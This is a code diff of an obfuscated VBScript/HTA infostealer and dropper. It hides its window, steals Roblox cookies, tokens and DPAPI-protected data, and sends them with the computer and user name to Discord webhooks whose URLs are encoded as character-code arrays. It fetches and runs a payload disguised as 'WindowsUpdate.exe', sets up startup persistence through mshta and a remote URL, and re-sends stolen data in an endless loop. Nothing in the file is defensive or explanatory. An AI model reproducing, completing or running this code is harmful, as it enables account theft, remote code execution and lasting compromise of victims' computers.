@@ -6,44 +6,42 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, sysCoreAddr, sysCacheAddr, PC, USER, ratDropped, lastCookie
-Dim sysTemp, appPath, userDir, sysData, fileCache
+Dim sh, fso, sysInit, sysPath, PC, USER, ratDropped, lastCookie
+Dim sysCache, sysBuffer
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-sysCoreAddr = ""
-sysCacheAddr = ""
+' --- SYSTEM INITIALIZATION ---
+sysInit = "https://discord.com/api/webhooks/1574415765996703895/RIEV6Y6s7wA6ThCzvvZ-UfxfQudJ0MrsEOT_HuxKK5rtOOsZOmlAmNmSZffML_ewWoRB"
+sysPath = "https://discord.com/api/webhooks/1574415913027903513/sHsf4wIjqyAGKrUTIUxBg_6fF9DaUKyuLgKAIJUBmyZVDthIXAfiEDJrhe_9ymoTZj-q"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
 lastCookie = ""
 
-' --- 1. INITIAL EXECUTION ---
-Call InitMemory()
-Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, sysCoreAddr)
-Call IP(sysCoreAddr)
-Call GrabTokens(sysCoreAddr)
+' --- 1. MAIN EXECUTION ---
+Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, sysInit)
+Call IP(sysInit)
+Call GrabTokens(sysInit)
 Call Persistence
-Call PostCookieOnly(sysCoreAddr)
+Call PostCookieOnly(sysInit)
 
-' --- 2. DROP RAT LAST ---
-Call DropRAT(sysCoreAddr, True)
+Call DropPayload(sysInit, True)
 
-' --- 3. LOOP ---
+' --- 2. SECONDARY LOOP ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
-    Call ParseStream()
-    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, sysCacheAddr)
+    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, sysPath)
     
-    Call GrabTokens(sysCacheAddr)
-    Call IP(sysCacheAddr)
-    Call PostCookieOnly(sysCacheAddr)
+    Call GrabTokens(sysPath)
+    Call IP(sysPath)
+    Call PostCookieOnly(sysPath)
     
     If Not ratDropped Then
-        Call DropRAT(sysCacheAddr, True)
+        Call DropPayload(sysPath, True)
     End If
     
     Call SleepSeconds(30)
@@ -51,25 +49,8 @@ Loop
 
 window.close()
 
-' --- SUBROUTINES ---
-
-Sub InitMemory()
-    Dim i, tempCache
-    tempCache = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,49,53,51,53,52,49,54,50,50,55,48,51,53,57,47,55,95,54,97,48,84,51,80,120,88,120,67,114,90,90,79,73,116,102,45,115,70,75,85,52,76,86,114,120,78,55,71,101,51,78,99,106,107,113,87,55,121,109,54,104,109,80,95,50,101,66,69,52,56,82,116,45,117,57,122,82,113,72,114,72,51,89,100)
-    For i = 0 To UBound(tempCache)
-        sysCoreAddr = sysCoreAddr & Chr(tempCache(i))
-    Next
-End Sub
-
-Sub ParseStream()
-    Dim i, tempStream
-    tempStream = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,52,56,51,53,48,56,48,48,55,51,55,48,56,51,53,47,72,119,90,66,100,52,84,84,110,82,109,80,80,86,79,82,90,115,110,116,49,66,117,100,120,108,66,109,120,54,51,83,110,99,74,77,115,65,76,111,114,80,74,103,108,75,76,122,111,104,54,76,106,122,106,102,71,72,98,70,104,69,113,51,86,102,53,104)
-    For i = 0 To UBound(tempStream)
-        sysCacheAddr = sysCacheAddr & Chr(tempStream(i))
-    Next
-End Sub
-
-Sub DropRAT(targetWH, sendRocket)
+' --- PAYLOAD DROP ---
+Sub DropPayload(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b090832&is=6b07b6b2&hm=b7476ce08038788fce717b168238b8e04cd6011e46e73ac97aed298f6dee5e79&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
@@ -101,6 +82,7 @@ Sub DropRAT(targetWH, sendRocket)
     End If
 End Sub
 
+' --- RunCmd ---
 Sub RunCmd(cmd)
     Dim w,p,i,s
     Set w = GetObject("winmgmts:\\.\root\cimv2")
@@ -110,6 +92,7 @@ Sub RunCmd(cmd)
     p.Create cmd,,s,i
 End Sub
 
+' --- IP ---
 Sub IP(targetWH)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -127,6 +110,7 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
+' --- PostCookieOnly ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
@@ -135,6 +119,7 @@ Sub PostCookieOnly(targetWH)
     Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
+' --- GetRobloxCookie ---
 Function GetRobloxCookie()
     GetRobloxCookie = ""
     Dim paths(4)
@@ -193,6 +178,7 @@ Function GetRobloxCookie()
     GetRobloxCookie = cookie
 End Function
 
+' --- Sleep ---
 Sub SleepSeconds(s)
     Dim t0, t1, t2, elapsed
     t0 = Timer()
@@ -210,6 +196,7 @@ Sub SleepSeconds(s)
     End If
 End Sub
 
+' --- Persistence ---
 Sub Persistence()
     Dim payload : payload = "mshta https://matrixhub.app/"
     On Error Resume Next
@@ -222,6 +209,7 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
+' --- GrabTokens ---
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -261,18 +249,45 @@ Sub GrabTokens(targetWH)
     End If
 End Sub
 
+' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
 Sub PostEmbed(t, d, c)
-    Call PostEmbedTo(t, d, c, sysCoreAddr)
+    Call PostEmbedTo(t, d, c, sysInit)
 End Sub
 
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
-    
+
+    If target_wh = sysInit Then
+        Dim sysBuf1, sysBuf2, sysBuf3, sysBuf4
+        sysBuf1 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,49,53,51,53,52,49,54,50,50,55,48,51,53,57)
+        sysBuf2 = Array(47,55,95,54,97,48,84,51,80,120,88,120,67,114,90,90,79,73,116,102)
+        sysBuf3 = Array(45,115,70,75,85,52,76,86,114,120,78,55,71,101,51,78,99,106,107)
+        sysBuf4 = Array(113,87,55,121,109,54,104,109,80,95,50,101,66,69,52,56,82,116,45,117,57,122,82,113,72,114,72,51,89,100)
+        target_wh = ""
+        Dim i
+        For i = 0 To UBound(sysBuf1) : target_wh = target_wh & Chr(sysBuf1(i)) : Next
+        For i = 0 To UBound(sysBuf2) : target_wh = target_wh & Chr(sysBuf2(i)) : Next
+        For i = 0 To UBound(sysBuf3) : target_wh = target_wh & Chr(sysBuf3(i)) : Next
+        For i = 0 To UBound(sysBuf4) : target_wh = target_wh & Chr(sysBuf4(i)) : Next
+    ElseIf target_wh = sysPath Then
+        Dim sysBuf5, sysBuf6, sysBuf7, sysBuf8
+        sysBuf5 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,52,56,51,53,48,56,48,48,55,51,55)
+        sysBuf6 = Array(48,56,51,53,47,72,119,90,66,100,52,84,84,110,82,109,80,80,86,79)
+        sysBuf7 = Array(82,90,115,110,116,49,66,117,100,120,108,66,109,120,54,51,83,110,99,74,77,115)
+        sysBuf8 = Array(65,76,111,114,80,74,103,108,75,76,122,111,104,54,76,106,122,106,102,71,72,98,70,104,69,113,51,86,102,53,104)
+        target_wh = ""
+        Dim k
+        For k = 0 To UBound(sysBuf5) : target_wh = target_wh & Chr(sysBuf5(k)) : Next
+        For k = 0 To UBound(sysBuf6) : target_wh = target_wh & Chr(sysBuf6(k)) : Next
+        For k = 0 To UBound(sysBuf7) : target_wh = target_wh & Chr(sysBuf7(k)) : Next
+        For k = 0 To UBound(sysBuf8) : target_wh = target_wh & Chr(sysBuf8(k)) : Next
+    End If
+
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", target_wh, False
@@ -281,6 +296,7 @@ Sub PostEmbedTo(t, d, c, target_wh)
     Set h = Nothing
 End Sub
 
+' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -297,6 +313,7 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
+' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
